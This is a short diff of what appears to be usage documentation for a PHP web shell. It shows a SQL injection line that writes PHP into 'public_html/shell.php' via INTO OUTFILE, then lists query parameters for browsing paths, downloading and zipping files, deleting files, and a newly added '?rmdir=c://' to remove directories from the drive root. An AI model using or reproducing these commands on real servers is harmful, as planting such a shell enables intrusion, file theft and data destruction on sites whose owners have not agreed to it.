@@ -8,9 +8,11 @@ LIKE : `SELECT "'.$phpString.'" INTO OUTFILE "public_html/shell.php"`
 
 to read path   `?path=c://`
 
-to delete file `?unlink=public_html/shell.php`
+to remove path `?rmdir=c://`
 
 to read file   `?download=public_html/shell.php`
+
+to remove file `?unlink=public_html/shell.php`
 
 to zip folder `?path=public_html/&destination=name_zip_file`
 
